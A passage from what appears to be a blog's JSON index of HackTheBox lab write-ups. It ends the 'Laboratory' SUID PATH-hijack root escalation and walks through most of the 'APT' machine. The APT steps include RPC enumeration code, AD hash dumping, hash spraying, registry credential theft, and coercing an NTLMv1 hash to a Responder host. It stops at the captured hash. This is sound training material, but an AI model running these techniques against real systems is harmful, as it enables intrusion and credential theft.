docker-security setuid(0) = -1 setgid(0) = -1 system(\u0026#34;chmod 700 /usr/bin/docker\u0026#34;chmod: changing permissions of \u0026#39;/usr/bin/docker\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 system(\u0026#34;chmod 660 /var/run/docker.sock\u0026#34;chmod: changing permissions of \u0026#39;/var/run/docker.sock\u0026#39;: Operation not permitted \u0026lt;no return ...\u0026gt; --- SIGCHLD (Child exited) --- \u0026lt;... system resumed\u0026gt; ) = 256 +++ exited (status 0) +++ Knowing this, I could hijack the execution path.\nSUID - Path Hijack First, I\u0026rsquo;ll create a fake chmod that calls bash binary at /dev/shm, I\u0026rsquo;ll also add an execute permission on that file.\ndexter@laboratory:~$ cd /dev/shm dexter@laboratory:/dev/shm$ echo -e \u0026#39;#!/bin/bash\\n/bin/bash\u0026#39; \u0026gt; chmod dexter@laboratory:/dev/shm$ dexter@laboratory:/dev/shm$ /bin/chmod +x chmod Next, I\u0026rsquo;ll add current directory (/dev/shm) to $PATH variable. Now if I call chmod, it will point to my chmod on /dev/shm\ndexter@laboratory:/dev/shm$ export PATH=$(pwd):$PATH dexter@laboratory:/dev/shm$ dexter@laboratory:/dev/shm$ which chmod /dev/shm/chmod And now I can just execute docker-security to obtain a root access as well as the root flag.\ndexter@laboratory:/dev/shm$ docker-security root@laboratory:/dev/shm# root@laboratory:/dev/shm# cut -c6- /root/root.txt 9f593f335a0a1f403c753719eb6  References  https://hackerone.com/reports/827052  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/","summary":"Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application\u0026rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container finds a private user repository that contains a pair of SSH keys.","tags":["Linux","GitLab","CVE-2020-10977","Arbitrary-file-read","LFI2RCE","Metasploit","Recover-git","Deserialization","Path-hijack","SUID"],"title":"HackTheBox - Laboratory"},{"content":"APT is an insane difficulty Windows machine from HackTheBox and it starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named ServerAlive() can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain all the users' hashes. Brute-force attack is performed to obtain one valid credentials from these hashes. With these credentials, I\u0026rsquo;m able to send a query to the registry and obtain another set of credentials for remote access to the system. A PowerShell history reveals that the machine is configured to accept NTLMv1 authentication, which is then exploited to get Administrator access.\nSkills Learned  RPC enumeration Port Forwarding Remote Registry Exploiting NTLMv1  Tools  Nmap Gobuster - https://github.com/OJ/gobuster Impacket - https://github.com/SecureAuthCorp/impacket IOXIDResolver - https://github.com/mubix/IOXIDResolver CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec Socat Kerbrute - https://github.com/ropnop/kerbrute pyKerbrute - https://github.com/3gstudent/pyKerbrute Responder - https://github.com/lgandx/Responder  Reconnaissance Nmap - IPv4 Both the initial scan and full scan with nmap shows two open ports: HTTP with IIS server on port 80, and MSRPC on port 135.\n→ root@iamf «apt» «10.10.14.72» $ nmap -sC -sV -oA nmap/initial-apt \u0026#39;10.10.10.213\u0026#39; -v PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home 135/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Enumeration TCP 80 - Website Visiting port 80 on the browser shows up a website called \u0026ldquo;Gigantic Hosting\u0026rdquo;.\nThe input vectors on https://10.13.38.16/contact-post.html don\u0026rsquo;t appear to be neither vulnerable nor injectable.\nIt sends a post request with an empty body to a host that can not be resolved by my network.\nHere is the example request.\nPOST https://10.13.38.16/contact-post.html HTTP/1.1 Host: 10.13.38.16 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Referer: http://10.10.10.213/support.html Content-Type: application/x-www-form-urlencoded Content-Length: 0 Connection: keep-alive Upgrade-Insecure-Requests: 1 I did ran gobuster, but didn\u0026rsquo;t find anything interesting.\nTCP 135 - MSRPC Remote Procedure Call (RPC) allows applications to invoke a function (or procedure or subroutine) of a remote computer without having to understand the network’s details, and MSRPC is Microsoft’s enhanced version of DCE/RPC. MSRPC works together with the Distributed Component Object Model (DCOM), and DCOM provides a mechanism for exposing application objects and it consists of a set of RPC interfaces that can be implemented over any RPC Transport.\nDCOM and RPC endpoint mapper sit on port 135 (both of them run on the shared process of svchost.exe). The RPC endpoint mapper maintains the database of endpoints that clients use to map an interface to endpoints, and there is a tool called rpcdump.py from Impacket that can be used to dump those endpoints:\n→ root@iamf «apt» «10.10.14.72» $ rpcdump.py -port 135 \u0026#39;10.10.10.213\u0026#39; [*] Retrieving endpoint list from 10.10.10.213 ...[SNIP]... Protocol: [MS-RSP]: Remote Shutdown Protocol Provider: wininit.exe UUID : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 Bindings: ncacn_ip_tcp:10.10.10.213[49664] ncalrpc:[WindowsShutdown] ncacn_np:\\\\APT[\\PIPE\\InitShutdown] ncalrpc:[WMsgKRpc06C4F0] ...[SNIP]... [*] Received 265 endpoints. ncacn_http, ncacn_np, ncacn_ip_tcp are known as protocol string/protocol sequence. It is the language (protocol) that a network operating system uses to talk over the network to other computers [source].\nScan for Listening RPC Interfaces I can use rpcmap.py, which also from Impacket, to get a list of currently listening RPC interfaces that are accessible over TCP/IP.\n→ root@iamf «apt» «10.10.14.72» $ rpcmap.py \u0026#39;ncacn_ip_tcp:10.10.10.213[135]\u0026#39; -brute-uuid ...[SNIP]... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 000001A0-0000-0000-C000-000000000046 v0.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0 Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 ...[SNIP]... [*] Tested 354 UUID(s) From the results above, three of them are the interfaces provided by DCOM, details of those interfaces are documented by Microsoft in well-known UUIDs.\n   Name GUID Purpose Definition     IID_IRemoteSCMActivator {000001A0-0000-0000-C000-000000000046} RPC interface UUID for IRemoteSCMActivator RemoteSCMActivator is another remote activation interface of the DCOM Remote Protocol.   IID_IActivation {4d9f4ab8-7d1c-11cf-861e-0020af6e7c57} RPC interface UUID for IActivation IActivation is the DCOM Remote Protocol remote activation interface supported on all versions of the DCOM Remote Protocol   IID_IObjectExporter {99fcfec4-5260-101b-bbcb-00aa0021347a} RPC interface UUID for IObjectExporter IObjectExporter is the interface used for OXID resolution, pinging, and server aliveness tests. All object resolvers MUST support the IObjectExporter interface    Network Interfaces Enumeration According to this post, written by Nicolas Delhaye, the ServerAlive2() method in IObjectExport (also known as IOXIDResolver) interface can be used to retrieve a list of network interfaces of a remote computer. Nicolas also provides the PoC for this.\n Opnum is operation number to identify a specific rpc method or a method in an interface.\n I can use rpcmap.py with -brute-opnums option to determine which interface\u0026rsquo;s methods are accessible, and the IObjectExport interface shows that Opnum 3 and Opnum 5 are accessible, this means access to ServerAlive() is allowed.\n→ root@iamf «rpc-enum» «10.10.14.72» $ rpcmap.py -brute-opnums -opnum-max 5 \u0026#39;ncacn_ip_tcp:10.10.10.213\u0026#39; ...[SNIP]... Protocol: [MS-DCOM]: Distributed Component Object Model (DCOM) Remote Provider: rpcss.dll UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0 Opnum 0: rpc_x_bad_stub_data Opnum 1: rpc_x_bad_stub_data Opnum 2: rpc_x_bad_stub_data Opnum 3: success Opnum 4: rpc_x_bad_stub_data Opnum 5: success From here, I can use the provided PoC script.\n#!/usr/bin/python import sys, getopt from impacket.dcerpc.v5 import transport from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_NONE from impacket.dcerpc.v5.dcomrt import IObjectExporter def main(argv): try: opts, args = getopt.getopt(argv,\u0026#34;ht:\u0026#34;,[\u0026#34;target=\u0026#34;]) except getopt.GetoptError: print \u0026#39;IOXIDResolver.py -t \u0026lt;target\u0026gt;\u0026#39; sys.exit(2) target_ip = \u0026#34;192.168.1.1\u0026#34; for opt, arg in opts: if opt == \u0026#39;-h\u0026#39;: print(\u0026#39;IOXIDResolver.py -t \u0026lt;target\u0026gt;\u0026#39;) sys.exit() elif opt in (\u0026#34;-t\u0026#34;, \u0026#34;--target\u0026#34;): target_ip = arg authLevel = RPC_C_AUTHN_LEVEL_NONE stringBinding = r\u0026#39;ncacn_ip_tcp:%s\u0026#39; % target_ip rpctransport = transport.DCERPCTransportFactory(stringBinding) portmap = rpctransport.get_dce_rpc() portmap.set_auth_level(authLevel) portmap.connect() objExporter = IObjectExporter(portmap) bindings = objExporter.ServerAlive2() print(\u0026#34;[*] Retrieving network interface of \u0026#34; + target_ip) for binding in bindings: NetworkAddr = binding[\u0026#39;aNetworkAddr\u0026#39;] print \u0026#34;Address: \u0026#34; + NetworkAddr if __name__ == \u0026#34;__main__\u0026#34;: main(sys.argv[1:]) The script returns with two IPv6 addresses of the machine.\n→ root@iamf «rpc-enum» «10.10.14.72» $ ./IOXIDResolver.py -t \u0026#39;10.10.10.213\u0026#39; [*] Retrieving network interface of 10.10.10.213 Address: apt Address: 10.10.10.213 Address: dead:beef::b885:d62a:d679:573f Address: dead:beef::89df:c1d4:6aaf:67ce I will add these addresses to my /etc/hosts file.\n→ root@iamf «rpc-enum» «10.10.14.72» $ echo \u0026#39;dead:beef::b885:d62a:d679:573f apt\u0026#39; \u0026gt;\u0026gt; /etc/hosts Nmap - IPv6 I will run another nmap scan against the machine on the IPv6 address.\n For me, scanning these two addresses returns the same results.\n This time, nmap shows the common ports of Active Directory domain controller.\n→ root@iamf «apt» «10.10.14.72» $ nmap -6 --min-rate 1000 -sC -sV -oA nmap/initial-apt-ipv6 \u0026#39;dead:beef::b885:d62a:d679:573f\u0026#39; -v ...[SNIP]... PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Gigantic Hosting | Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-04-15 00:36:03Z) 135/tcp open msrpc Microsoft Windows RPC 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Issuer: commonName=apt.htb.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-24T07:07:18 | Not valid after: 2050-09-24T07:17:18 | MD5: c743 dd92 e928 50b0 aa86 6f80 1b04 4d22 |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45 |_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time. 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=apt.htb.local | Subject Alternative Name: DNS:apt.htb.local | Issuer: commonName=apt.htb.local | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-24T07:07:18 | Not valid after: 2050-09-24T07:17:18 | MD5: c743 dd92 e928 50b0 aa86 6f80 1b04 4d22 |_SHA-1: f677 c290 98c0 2ac5 8575 7060 683d cdbc 5f86 5d45 |_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=4/14%Time=60778A78%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: apt | NetBIOS computer name: APT\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: apt.htb.local |_ System time: 2021-04-15T01:38:41+01:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-04-15T00:38:39 |_ start_date: 2021-04-14T16:50:06 I will take notes on:\n  Domain name: htb.local\n  FQDN: apt.htb.local\n  Host: Windows Server 2016 Standard 14393\n  On a full port scan, there is a WinRM listening on IPv6.\n→ root@iamf «rpc-enum» «10.10.14.72» $ nmap -p- --min-rate 1000 -6 -v \u0026#39;dead:beef::b885:d62a:d679:573f\u0026#39; ...[SNIP]... PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 389/tcp open ldap 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman ...[SNIP]... TCP 445 - SMB (IPv6) Anonymous access is allowed on SMB. The backup share seems interesting here, so I will dig into that share.\n→ root@iamf «apt» «10.10.14.72» $ smbclient -N -L //apt Anonymous login successful Sharename Type Comment --------- ---- ------- backup Disk IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share apt is an IPv6 address -- no workgroup available In the backup share, there is a file calledbackup.zip . I will download it to my Kali.\n→ root@iamf «apt» «10.10.14.72» $ smbclient -N //apt/backup Anonymous login successful Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Thu Sep 24 03:30:52 2020 .. D 0 Thu Sep 24 03:30:52 2020 backup.zip A 10650961 Thu Sep 24 03:30:32 2020 10357247 blocks of size 4096. 6964173 blocks available smb: \\\u0026gt; get backup.zip getting file \\backup.zip of size 10650961 as backup.zip (502.9 KiloBytes/sec) (average 502.9 KiloBytes/sec) Zip Crack The backup file is protected with a password. So I will use zip2john.py to convert this backup.zip into crackable hash format, and then transfer the hash to my Windows for cracking.\n→ root@iamf «loot» «10.10.14.72» $ zip2john backup.zip \u0026gt; backup.zip.hash → root@iamf «loot» «10.10.14.72» $ cat backup.zip.hash backup.zip:$pkzip2$3*1*1*0*8*24*9beb*9ac6*0f135e8d5f02f852643d295a889cbbda196562ad42425146224a8804421ca88f999017ed*1*0*8*24*acd0*9cca*0949e46299de5eb626c75d63d010773c62b27497d104ef3e2719e225fbde9d53791e11a5*2*0*156*4000*2a393785*81733d*37*8*156*2a39*9cca*0325586c0d2792d98131a49d1607f8a2215e39d59be74062d0151084083c542ee61c530e78fa74906f6287a612b18c788879a5513f1542e49e2ac5cf2314bcad6eff77290b36e47a6e93bf08027f4c9dac4249e208a84b1618d33f6a54bb8b3f5108b9e74bc538be0f9950f7ab397554c87557124edc8ef825c34e1a4c1d138fe362348d3244d05a45ee60eb7bba717877e1e1184a728ed076150f754437d666a2cd058852f60b13be4c55473cfbe434df6dad9aef0bf3d8058de7cc1511d94b99bd1d9733b0617de64cc54fc7b525558bc0777d0b52b4ba0a08ccbb378a220aaa04df8a930005e1ff856125067443a98883eadf8225526f33d0edd551610612eae0558a87de2491008ecf6acf036e322d4793a2fda95d356e6d7197dcd4f5f0d21db1972f57e4f1543c44c0b9b0abe1192e8395cd3c2ed4abec690fdbdff04d5bb6ad12e158b6a61d184382fbf3052e7fcb6235a996*$/pkzip2$::backup.zip:Active Directory/ntds.jfm, registry/SECURITY, Active Directory/ntds.dit:backup.zip Jtr recovers the password toiloveyousomuch instantly. Now I can unzip the backup file.\nC:\\tools\\john\\run\u0026gt; ./john.exe hashes/backup.zip.hash --wordlist=C:/tools/rockyou.txt ...[SNIP]... iloveyousomuch (backup.zip) 1g 0:00:00:00 DONE (2021-04-15 08:29) 35.71g/s 585142p/s 585142c/s 585142C/s 123456..christal This backup contains AD database.\n→ root@iamf «loot» «10.10.14.72» $ tree . ├── Active Directory │ ├── ntds.dit │ └── ntds.jfm └── registry ├── SECURITY └── SYSTEM Dumping NTLM Hashes ntds.dit is a database file for Active Directory environment, I can supply the SECURITY and SYSTEM files to secretsdump.py to extract all the NTLM hashes of all the available AD user accounts.\n NTDS stands for New Technology Directory Service and DIT stands for directory information tree.\n → root@iamf «loot» «10.10.14.72» $ secretsdump.py -ntds Active\\ Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY LOCAL \u0026gt; ad_hashes I saved the hash to a file called ad_hashes.\nTCP 88 - Kerberos Finding Valid Usernames Because there are so many data to try, I might accidentally get locked out if spraying blindly. But, with tools called Kerbrute, I can enumerate for valid users. The tools uses Kerberos pre-auth to determine a valid user.\nIf the user is a valid user, KDC returns UF_DONT_REQUIRE_PREAUTH. If it’s not, it returns KDC_ERR_C_PRINCIPAL_UNKNOWN.\nBefore that, I\u0026rsquo;ll pull the users and NTLM hash from ad_hashes and store them in separate list. I\u0026rsquo;ll feed users.list to kerbrute.\nusers.list\n→ root@iamf «loot» «10.10.14.72» $ cat ad_hashes | grep \u0026#39;aad3b435b51404eeaad3b435b51404ee\u0026#39; | cut -d : -f1 \u0026gt; ../users.list userhash.list\n→ root@iamf «loot» «10.10.14.72» $ cat ad_hashes | grep \u0026#39;aad3b435b51404eeaad3b435b51404ee\u0026#39; | cut -d : -f4 \u0026gt; ../userhash.list I ran kerbrute, and after some time, it returned three legitimate users.\n→ root@iamf «apt» «10.10.14.72» $ kerbrute userenum --dc apt --domain htb.local users.list ...[SNIP]... 2021/04/14 22:02:35 \u0026gt; Using KDC(s): 2021/04/14 22:02:35 \u0026gt; apt:88 2021/04/14 22:03:12 \u0026gt; [+] VALID USERNAME: APT$@htb.local 2021/04/14 22:03:12 \u0026gt; [+] VALID USERNAME: Administrator@htb.local 2021/04/14 22:07:31 \u0026gt; [+] VALID USERNAME: henry.vinson@htb.local 2021/04/14 22:15:52 \u0026gt; Done! Tested 2001 usernames (3 valid) in 796.320 second APT$ is an account used for authentication purposes in the domain, it can not be used to login into the system. Because of that, I\u0026rsquo;ll only keep administrator and henry.vinson on the list of valid users. But if I have a valid NT hash of this account, that would be very useful as it can be used for DCSync attack.\nHash Brute-force Using henry.vinson:2de80758521541d19cabba480b260e8f pair returns an authorization error message.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson -H 2de80758521541d19cabba480b260e8f Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Another option is to spray the NTLM hashes on henry.vinson.\nUnfortunately, kerbrute doesn\u0026rsquo;t support pass-the-hash yet. But there is a Python version of kerbrute called pyKerbrute. One of its tools called ADPwdSpray.py supports bruteforcing with hash.\n https://github.com/3gstudent/pyKerbrute  → root@iamf «apt» «10.10.14.72» $ git clone https://github.com/3gstudent/pyKerbrute.git By default, it only supports a single hash, so I’ve modified it a bit to work with a list of hashes and IPv6.\n...[SNIP]... if __name__ == \u0026#39;__main__\u0026#39;: kdc_a = sys.argv[1] # apt user_realm = sys.argv[2].upper() # htb.local user_name = sys.argv[3] # henry.vinson, administrator hashes = open(sys.argv[4], \u0026#39;r\u0026#39;).readlines() # aad3...hashes print(\u0026#39;[*] DomainControlerAddr: %s\u0026#39;%(kdc_a)) print(\u0026#39;[*] DomainName: %s\u0026#39;%(user_realm)) for user_hash in hashes: sys.stdout.write(\u0026#39;\\r[*] Trying hash: %s\u0026#39;%(user_hash)) # to make sure it checks every hash in list user_key = (RC4_HMAC, user_hash.strip(\u0026#39;\\r\\n\u0026#39;).decode(\u0026#39;hex\u0026#39;)) passwordspray_tcp(user_realm, user_name, user_key, kdc_a, user_hash) After a few minutes, it returns a valid hash that works on henry.vinson\n→ root@iamf «pyKerbrute» «10.10.14.72» $ wc -c ../userhash.list 66001 userhash.list → root@iamf «pyKerbrute» «10.10.14.72» git:(temp) ✗ $ python ADPwdSpray.py apt htb.local \u0026#39;henry.vinson\u0026#39; ../userhash.list | tee ../pykerbrute-spray [*] DomainControlerAddr: apt [*] DomainName: HTB.LOCAL ...[SNIP]... [+] Valid Login: henry.vinson:e53d87d42adaa3ca32bdb34a876cbffb Foothold Shell as henry.vinson_adm Forwarding IPv4 -\u0026gt; IPv6 Here, a relay or a port forwarding is required to make some tools work on IPv6. I came up with two solutions:\nFirst, use socat.\n→ root@iamf «apt» «10.10.14.72» $ socat tcp-listen:445,fork tcp6:apt:445 Second, use ssh.\n→ root@iamf «apt» «10.10.14.72» $ ssh -L 445:apt:445 root@localhost -Nf → root@iamf «apt» «10.10.14.72» $ netstat -tlpn Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:445 0.0.0.0:* LISTEN 8548/ssh tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 8087/sshd: /usr/sbin tcp6 0 0 ::1:445 :::* LISTEN 8548/ssh I can confirm both forwarding options work by running CrackMapExec to localhost using henry.vinson creds\n→ root@iamf «apt» «10.10.14.72» $ crackmapexec smb localhost -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb SMB 127.0.0.1 445 APT [*] Windows Server 2016 Standard 14393 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True) SMB 127.0.0.1 445 APT [+] htb.local\\henry.vinson e53d87d42adaa3ca32bdb34a876cbffb Registry Enumeration henry.vinson can not be used to login remotely into the box.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson -H e53d87d42adaa3ca32bdb34a876cbffb Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError Error: Exiting with code 1 Instead, I can perform enumeration on the user registry using reg.py from Impacket.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes \u0026#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; query -keyName HKU Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU HKU\\Console HKU\\Control Panel HKU\\Environment HKU\\Keyboard Layout HKU\\Network HKU\\Software HKU\\System HKU\\Volatile Environment Checking on HKU\\Software is worth trying since some applications may store their credentials in a registry.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes \u0026#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; query -keyName HKU\\\\Software Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\Software HKU\\Software\\GiganticHostingManagementSystem HKU\\Software\\Microsoft HKU\\Software\\Policies HKU\\Software\\RegisteredApplications HKU\\Software\\VMware, Inc. HKU\\Software\\Wow6432Node HKU\\Software\\Classes The HKU\\Software\\GiganticHostingManagementSystem contains a set of credentials for username henry.vinson_adm and a password of G1#Ny5@2dvht.\n→ root@iamf «apt» «10.10.14.72» $ reg.py htb.local/henry.vinson@apt -hashes \u0026#39;e53d87d42adaa3ca32bdb34a876cbffb:e53d87d42adaa3ca32bdb34a876cbffb\u0026#39; query -keyName HKU\\\\Software\\\\GiganticHostingManagementSystem Impacket v0.9.22.dev1+20200914.162022.81d44893 - Copyright 2020 SecureAuth Corporation [!] Cannot check RemoteRegistry status. Hoping it is started... HKU\\Software\\GiganticHostingManagementSystem UserName REG_SZ henry.vinson_adm PassWord REG_SZ G1#Ny5@2dvht Remote Access henry.vinson_adm credentials can be used to gain a foothold on the system remotely. I’ll just grab the user flag.\n→ root@iamf «apt» «10.10.14.72» $ evil-winrm -i apt -u henry.vinson_adm -p \u0026#39;G1#Ny5@2dvht\u0026#39; Evil-WinRM shell v2.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Documents\u0026gt; *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\\Desktop\u0026gt; type user.txt 745212a817f60f27befd...[SNIP]... Privilege Escalation Shell as administrator Enumeration Performing a text file enumeration finds a PowerShell history file.\n*Evil-WinRM* PS C:\\Users\\henry.vinson_adm\u0026gt; gci -Path C:\\Users -filter *.txt -Recurse -ErrorAction SilentlyContinue -Force ...[SNIP]... Directory: C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 11/10/2020 10:58 AM 458 ConsoleHost_history.txt *Evil-WinRM* PS C:\\Users\\henry.vinson_adm\u0026gt; type \u0026#34;C:\\Users\\henry.vinson_adm\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt\u0026#34; $Cred = get-credential administrator invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path \u0026#34;HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\u0026#34; lmcompatibilitylevel -Type DWORD -Value 2 -Force} From Wikipedia:\n Send NTLM response only: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; DCs accept LM, NTLM, and NTLMv2 authentication.\n With lmcompatibilitylevel = 2, it means the authentication process can be downgraded to NTLMv1. The attack is explained in detail here.\nThere is a site called https://crack.sh that provides a service for cracking NTLMv1 hash using rainbow tables for a specific challenge of \u0026ldquo;1122334455667788\u0026rdquo;.\nThe idea here is to force APT to make a request (challenge-response) to the server that the attacker controls, which has been configured to send the string \u0026ldquo;1122334455667788\u0026rdquo; as the challenge (after downgrading the authentication process to NTLMv1).\nAfter the server receives the response from the given challenge, I can send the NTLMv1 hash from that response to crack.sh for cracking and obtain NTLM/NT hash of APT afterward.\n Note:\n NetNTLM/NTLMv1 is an authentication protocol NetNTLM/NTLMv1 hash != NTLM hash NetNTLM/NTLMv1 hash contains NTLM hash   Stealing NTLMv1 hash via MpCmdRun.exe MpCmdRun.exe is part of Windows Defender that always runs with SYSTEM privileges. I can abuse this behavior to scan a file on my SMB server and capture the NTLMv1 authentication hash.\n This article explaining how authentication proccess over SMB work\n For this, I’ll need to edit /etc/responder/Responder.conf first, and change the challenge from \u0026ldquo;random\u0026rdquo; to \u0026ldquo;1122334455667788\u0026rdquo;.\nAfter that, I can start Responder to listen on my tun0 interface and specify the --lm option which will downgrade the authentication to NTLMv1.\n→ root@iamf «~» «10.10.14.72» $ responder -I tun0 --lm __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR \u0026amp; MDNS Responder 2.3.4.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [OFF] FTP server [OFF] IMAP server [OFF] POP3 server [OFF] SMTP server [OFF] DNS server [ON] LDAP server [ON] RDP server [OFF] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [ON] Fingerprint hosts [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.72] Challenge set [1122334455667788] Don\u0026#39;t Respond To Names [\u0026#39;ISATAP\u0026#39;] [+] Listening for events... Now on APT, I can force authentication with MpCmdRun.exe (located on C:\\Program Files\\Windows Defender), and it errors out.\n*Evil-WinRM* PS C:\\Program Files\\Windows Defender\u0026gt;.\\MpCmdRun.exe -Scan -ScanType 3 -File \\\\10.10.14.72\\notexist Scan starting... CmdTool: Failed with hr = 0x80508023. Check C:\\Users\\HENRY~2.VIN\\AppData\\Local\\Temp\\MpCmdRun.log for more information  Active Directory uses Kerberos as the default authentication method, but it will fallback to NTLM authentication if the client try to connect to other hosts with IP address\n But on my Kali, responder has successfully captured the hash of APT$, the computer account of the box.\n...\u0026lt;snip\u0026gt;.. [+] Listening for events... [SMB] NTLMv1 Client : 10.10.10.213 [SMB] NTLMv1 Username : HTB\\APT$ [SMB] NTLMv1 Hash : 